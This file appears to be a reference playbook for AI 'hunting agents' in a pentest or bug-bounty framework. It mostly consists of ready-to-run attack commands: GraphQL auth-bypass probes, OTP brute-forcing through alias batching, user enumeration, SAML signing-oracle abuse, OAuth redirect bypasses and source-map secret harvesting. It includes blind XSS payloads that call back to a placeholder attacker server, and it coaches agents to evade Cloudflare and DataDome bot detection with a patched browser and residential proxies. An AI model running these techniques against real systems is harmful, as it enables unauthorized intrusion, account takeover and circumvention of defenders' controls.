# Proven Attack Techniques

Field-tested techniques from real engagements. Reference file for all hunting agents.

## GraphQL Resolver-Level Auth Bypass

**Pattern**: Authentication is opt-in per resolver, not enforced at the service layer.

**Detection**: Send requests with and without auth header. If responses differ only at the business logic level (not auth level), auth middleware is absent.

```bash
# With no auth:
curl -X POST https://target/graphql -H "Content-Type: application/json" \
  -d '{"query":"mutation { dangerousMutation(input: {field: \"test\"}) { success } }"}'

# With fake auth:
curl -X POST https://target/graphql -H "Content-Type: application/json" \
  -H "Authorization: Bearer invalidtoken123" \
  -d '{"query":"mutation { dangerousMutation(input: {field: \"test\"}) { success } }"}'

# If BOTH return the same backend error (404, NullReferenceException, business error)
# instead of 401/403 → auth middleware is absent on this resolver
```

**Key insight**: A 401/403 = auth middleware caught it. A backend error (500, 404, business logic error) = auth was never checked.

Test every mutation without auth header. Focus on state-changing mutations: SSO mappings, password resets, user updates, session management.

## DRF Authentication Semantics Proof

**Pattern**: Django REST Framework enforces auth BEFORE queryset access.

```bash
# Auth-required endpoint:
curl -s "https://api.target.com/accounts/"
# → HTTP 401: {"detail":"Authentication credentials were not provided."}

# Unauthenticated endpoint (AllowAny):
curl -s "https://api.target.com/public-resource/nonexistent-id/"
# → HTTP 404: {"detail":"Not found."}
# 404 at object lookup = auth was bypassed, AllowAny permission class
```

**Rule**: In DRF, a 404 with a queryset-level error message proves authentication was never checked.

## OAuth Auth Code Leakage to Analytics

**Pattern**: OAuth code in URL query parameter → analytics SDK fires page_view with full URL → code transmitted to GA4/LogRocket/Segment before the application consumes it.

**Detection** (no account needed):
```bash
# Check if analytics tags exist on the OAuth callback page:
curl -s "https://target.com/callback?code=test_probe&state=test" | grep -iE "gtag|ga4|logrocket|segment|amplitude|mixpanel|heap"

# If analytics found, simulate the event to confirm acceptance:
curl -s -X POST "https://region1.google-analytics.com/g/collect?v=2&tid=G-XXXXXXX" \
  -d "en=page_view&dl=https%3A%2F%2Ftarget.com%2Fcallback%3Fcode%3Dtest_probe"
# 204 = event accepted → code is leaked to analytics
```

**Chain**: Code leak + public client (no secret) + no PKCE → ATO

## PKCE Enforcement Check

**Pattern**: Distinguish "code invalid" from "PKCE required".

```bash
# Send token request WITHOUT code_verifier:
curl -X POST "https://auth.target.com/oauth/token" \
  -d "grant_type=authorization_code&code=fake&client_id=CLIENT_ID&redirect_uri=REDIRECT"

# If response is "invalid_grant" → PKCE NOT enforced (code just expired/invalid)
# If response is "invalid_request: code_verifier required" → PKCE IS enforced
```

Also check if client_secret is required:
```bash
# Without secret: "invalid_grant" = public client (no secret needed)
# Without secret: "invalid_client" = confidential client (secret required)
```

## Source Map Analysis

**Pattern**: Production JS bundles with `.map` files expose full TypeScript source.

```bash
# Check for source maps:
curl -sI "https://target.com/static/js/main.abc123.js.map" | head -1
# 200 = source map accessible

# Extract and analyze:
curl -s "https://target.com/static/js/main.abc123.js.map" | python3 -c "
import sys, json
sm = json.load(sys.stdin)
print(f'{len(sm[\"sources\"])} source files')
# Look for: API clients, auth logic, admin endpoints, secrets
for src in sm['sources']:
    if any(k in src.lower() for k in ['auth', 'admin', 'api', 'secret', 'config', 'env']):
        print(f'  HIGH PRIORITY: {src}')
"
```

**What to look for**:
- API client code with `prepareHeaders` (or lack thereof → no auth)
- `Company-Override`, `X-Admin`, or similar privilege-escalation headers
- OAuth client IDs, Okta issuer URLs
- Internal service URLs (`*.internal`, `*.corp`, `edge.<service>.region`)
- Feature flags, A/B test configurations
- Environment detection code (`REACT_APP_*`, `window.config`)

## gRPC Method Enumeration via Proxy Errors

**Pattern**: Envoy/gRPC-Web proxies leak exact method names in error responses.

```bash
curl -s "https://target.com/v1/accounts/" -H "Authorization: Bearer invalid"
# Returns: {"code":7,"message":"Unauthorized Request: [...] method = /service.v1.Service/AccountList"}
```

The error reveals the full gRPC service and method path. Enumerate by trying common REST paths:
```bash
for resource in accounts users orders holdings portfolios wallets transactions; do
  echo -n "$resource: "
  curl -s "https://target.com/v1/${resource}/" | grep -oP 'method = [^"]+' || echo "no method leak"
done
```

## GraphQL Schema Reconstruction (Clairvoyance)

**Pattern**: Apollo Server returns field suggestions for typos, enabling schema reconstruction without introspection.

```bash
# Trigger field suggestions:
curl -X POST "https://target/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ usr }"}'
# Returns: "Cannot query field "usr" on type "Query". Did you mean "user"?"

# Discover subfields:
curl -X POST "https://target/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ user }"}'
# Returns: 'Field "user" of type "ActiveUser" must have a selection of subfields'

# Enumerate type fields:
curl -X POST "https://target/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ user { eml } }"}'
# Returns: 'Cannot query field "eml" on type "ActiveUser". Did you mean "email"?'
```

Works even when introspection is disabled. Build the full schema iteratively.

## User Enumeration via Error Path Divergence

**Pattern**: Backend returns different internal error paths for valid vs invalid users.

```bash
# Valid user — backend proceeds further, hits different internal URL:
curl -X POST target/graphql -d '{"query":"mutation{updateUser(userData:{email:\"x\"},currentUserName:\"real@user.com\"){success}}"}'
# Error references: /UserPreferences/GetPreferencesForUser

# Invalid user — backend stops earlier, different internal URL:
curl -X POST target/graphql -d '{"query":"mutation{updateUser(userData:{email:\"x\"},currentUserName:\"fake@nobody.com\"){success}}"}'
# Error references: /AllowedUserIpAddress
```

Any measurable difference (error message, response time, status code, error path) = enumeration oracle.

## GraphQL Alias Batching (Rate Limit Bypass)

**Pattern**: GraphQL supports aliases, letting you send N operations in a single HTTP request.

```graphql
mutation BatchBrute {
  a1: verifyOtp(token: "000001") { success }
  a2: verifyOtp(token: "000002") { success }
  a3: verifyOtp(token: "000003") { success }
  a4: verifyOtp(token: "000004") { success }
  a5: verifyOtp(token: "000005") { success }
  a6: verifyOtp(token: "000006") { success }
  a7: verifyOtp(token: "000007") { success }
  a8: verifyOtp(token: "000008") { success }
  a9: verifyOtp(token: "000009") { success }
  a10: verifyOtp(token: "000010") { success }
}
```

10 OTP attempts in 1 HTTP request. At 100 req/sec = 1000 OTP attempts/sec.
6-digit OTP = 1,000,000 combinations → brute-forced in ~17 minutes.

Rate limiters that count HTTP requests (not GraphQL operations) are bypassed.

## SAML Signing Oracle

**Pattern**: SAML IdP endpoint that signs assertions without requiring authentication.

```bash
# Check if the SP-initiated SSO endpoint requires auth:
curl -s -X POST 'https://target.com/saml/sso' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'status={"primaryCode":"urn:oasis:names:tc:SAML:2.0:status:Success"}'

# If it returns a signed SAML assertion → signing oracle
# Submit the assertion to the ACS endpoint for authenticated access
```

**Detection clues**:
- ASP.NET stack trace mentioning `GenerateSAMLResponse`
- Endpoint path containing `SSO`, `SAML`, `SingleSignOn`
- No `InResponseTo` attribute in assertion = IdP-initiated (no session binding)

## Report Extension Convention

When discovering additional impact that extends an already-submitted report, create a `COMMENT-<original-slug>.md` file with the chain extension. Never edit the original submitted report draft.

## Framework-Specific Auth Detection

### Django REST Framework (DRF)
- 401 with `"detail":"Authentication credentials were not provided."` = auth enforced
- 404 with `"detail":"Not found."` or queryset error = auth bypassed (AllowAny)
- DRF enforces auth BEFORE queryset access — any database-level error means auth passed
- Look for `permission_classes = [AllowAny]` in source maps
- Common DRF API patterns: `/api/v1/`, `/api/v2/`, viewset-style URLs

### ASP.NET / .NET Core
- `System.ArgumentNullException` or `NullReferenceException` in response = code reached without auth
- Stack traces mentioning `Controller` class names reveal internal architecture
- SAML: check `SPSingleSignOn`, `GenerateSAMLResponse` endpoints for unauthenticated signing
- Error responses may leak internal URLs (e.g., `fusionapi.internal/Service/Method`)

### Envoy / gRPC-Web Proxy
- 403 responses leak exact gRPC method: `method = /service.v1.Service/MethodName`
- Non-v1 paths may bypass RBAC (e.g., `/accounts/` works but `/v1/accounts/` is gated)
- `"Could not resolve"` on PUT/PATCH/DELETE = Envoy only routes GET+POST to gRPC

### GraphQL (Apollo Server)
- Field suggestions on typos reconstruct schema without introspection
- `"Cannot query field X. Did you mean Y?"` → reveals field names
- `"Field X of type Y must have a selection of subfields"` → reveals type names
- Alias batching: N mutations per request bypasses per-request rate limits
- Test EVERY mutation without auth — document which return 401 vs backend errors

## OAuth Full Audit Checklist

Run these checks in sequence for any OAuth implementation:

1. **Public client check**: POST token endpoint without `client_secret`
   - `invalid_grant` = public client (no secret needed) — escalate
   - `invalid_client` = confidential client (secret required)

2. **PKCE enforcement**: POST token endpoint without `code_verifier`
   - `invalid_grant` = PKCE NOT enforced — escalate
   - `invalid_request: code_verifier required` = PKCE enforced

3. **State parameter**: Check if `state` is present in authorize URL
   - No state = CSRF on OAuth flow

4. **Analytics leakage**: Check callback page for analytics tags
   - `gtag`, `ga4`, `logrocket`, `segment`, `amplitude`, `mixpanel`, `heap`
   - Any analytics on callback page = auth code leaked to third party

5. **Redirect URI validation**: Try variations
   - `https://target.com/callback/../evil`
   - `https://evil.target.com/callback`
   - `https://target.com/callback#`
   - `https://target.com/callback/`

6. **Chain**: code leak + public client + no PKCE = ATO

## Internal Service Enumeration from JS Bundles

Production JS bundles often contain internal service references:

```bash
# Search for internal URLs in JS:
curl -s https://target.com/main.js | grep -oP 'https?://[a-z0-9.-]+\.(internal|corp|local|rh|dev)[^"'"'"']*' | sort -u

# Search for service codenames:
curl -s https://target.com/main.js | grep -oP '["'"'"'](edge|api|service)\.[a-z]+\.[a-z]+\.[a-z]+["'"'"']' | sort -u

# Search for window.config / process.env:
curl -s https://target.com/main.js | grep -oP 'window\.config\.[A-Z_]+|REACT_APP_[A-Z_]+|process\.env\.[A-Z_]+' | sort -u

# Search for Okta/Auth0 config:
curl -s https://target.com/main.js | grep -oP 'clientId['"'"'"]?\s*[:=]\s*["'"'"'][^"'"'"']+["'"'"']' | sort -u
```

Patterns to look for:
- `edge.<service>.region.<domain>` — internal service mesh
- `<service>-api`, `<service>-service` — microservice naming
- `*.internal`, `*.corp`, `*.dev`, `*.staging` — internal infrastructure
- Feature flag names — reveal unreleased functionality
- A/B test configurations — reveal test groups and features

## GraphQL Mutation Auth Audit

Systematic approach for testing all mutations:

```bash
# 1. Get all mutations (introspection or from JS bundle):
curl -X POST target/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { mutationType { fields { name args { name type { name } } } } } }"}'

# 2. For each mutation, test without auth:
for mutation in addUser updateUser deleteUser logout resetPassword; do
  echo "=== $mutation ==="
  curl -s -X POST target/graphql -H "Content-Type: application/json" \
    -d "{\"query\":\"mutation { ${mutation} { success } }\"}" | head -c 200
  echo
done

# 3. Categorize results:
# - 401/403 = auth enforced (resolver protected)
# - Backend error (500, NullRef, 404) = NO auth (resolver unprotected)
# - Business logic error = NO auth (reaches business logic)
# - success:true = NO auth AND functional (critical finding)
```

Document results in a table:
| Mutation | No Auth | Fake Auth | Status |
|----------|---------|-----------|--------|
| login | works | works | Public (intentional) |
| logout | works | works | MISSING AUTH |
| updateUser | backend error | same error | MISSING AUTH |
| addPermission | 403 | 403 | Protected |

## XSS Entry Points and Hidden Vectors

### Often-Missed XSS Surfaces
- **File upload names** — inject in the filename itself, not just the content
- **Profile/bio fields** — stored XSS when rendered on other users' pages
- **Error messages** — custom error pages that reflect input
- **Email templates** — input reflected in emails (check HTML source)
- **PDF generation** — SSRF/XSS via HTML-to-PDF engines (wkhtmltopdf, Puppeteer)
- **SVG uploads** — XML-based, supports `<script>` and event handlers
- **Markdown rendering** — many parsers allow HTML passthrough
- **WYSIWYG editors** — rich text editors often have bypass vectors
- **URL fragments** — `location.hash` consumed by client-side JS without encoding
- **window.name** — persists across navigations, used as DOM XSS source
- **postMessage handlers** — no origin check = XSS via cross-origin message

### Blind XSS Targets
Inject payloads that callback to your server in fields consumed by internal tools:
- Contact/feedback forms (rendered in admin panel)
- Support tickets (rendered in helpdesk)
- User-Agent / Referer headers (rendered in analytics dashboards)
- Log entries (rendered in log viewers like Kibana/Splunk)
- Webhook URLs (fetched and displayed by the application)

Use `<script src=https://YOUR_XSS_HUNTER>` or `"><img src=x onerror=fetch('https://YOUR_SERVER')>`

### XXE Entry Points (Often Missed)
- File uploads accepting DOCX, XLSX, PPTX (ZIP with XML inside)
- SVG image uploads
- SOAP endpoints
- RSS/Atom feed parsers
- XML-based config imports
- Content-Type: application/xml on endpoints that normally accept JSON

## Bypassing Bot Detection (CF / Akamai / Google / DataDome)

**Pattern:** Target returns 403, 429, a CloudFlare interstitial, a Turnstile widget, or a DataDome challenge to vanilla `curl`, `httpx`, or chromedriver-based probes. All further recon and client-side bug testing is blocked until the fingerprint surface is addressed.

**Detection:** Any of:
- `httpx -title` returns "Just a moment..." or "Attention Required!"
- `curl -sI target | grep -i cf-ray` present + 403 body
- `nuclei` reports "wafw00f: cloudflare (behind)"
- `chromedriver` Selenium returns the challenge HTML instead of the app HTML
- Screenshot from `grim`/`scrot` shows the CF/Turnstile widget, not the vulnerable page

**Response:** Reach for camofox-browser. It runs Camoufox (a Firefox fork patched at the C++ level to hide `navigator.webdriver`, spoof WebGL vendor/renderer, populate `navigator.plugins`, and fake `hardwareConcurrency`). See `docs/stealth-browsing.md` for the full operational reference.

**Quick start** (from the pentest-agents repo root):

```bash
$CLAUDE_PROJECT_DIR/tools/camofox_ctl.sh start
TAB=$(curl -sS -X POST http://localhost:9377/tabs \
  -H 'Content-Type: application/json' \
  -d '{"userId":"hunter","sessionKey":"target1","url":"https://target.example.com"}' \
  | jq -r .tabId)
curl -sS "http://localhost:9377/tabs/$TAB/snapshot?userId=hunter" | jq -r .snapshot
curl -sS "http://localhost:9377/tabs/$TAB/screenshot?userId=hunter&fullPage=true" \
  -o evidence/step_1_target.png
$CLAUDE_PROJECT_DIR/tools/camofox_ctl.sh stop
```

**Prefer dispatching** `browser-stealth-agent` via `Agent(subagent_type: "browser-stealth-agent", ...)` for any multi-step stealth interaction. It handles the lifecycle, tab management, and evidence capture conventions for you.

**Key insight:** The stealth is invisible to JS detection because it's applied at the C++ implementation level before JavaScript ever runs. This defeats detection that relies on `Function.prototype.toString` checks to see if `navigator.webdriver`, `WebGLRenderingContext.prototype.getParameter`, etc. have been monkey-patched. Vanilla Playwright + stealth plugins monkey-patch in JS and get caught by toString inspection. Camoufox doesn't patch in JS, so there's nothing to inspect.

**Caveat:** Stealth ≠ anonymity. The IP address is whatever your host's egress IP is — CF/Akamai weight IP reputation heavily, so from a datacenter or cloud VPS you'll still see Turnstile widgets even with clean fingerprints. For BB work, pair camofox with a residential proxy via the `PROXY_*` env vars (see `docs/stealth-browsing.md#residential-proxy--geoip`).
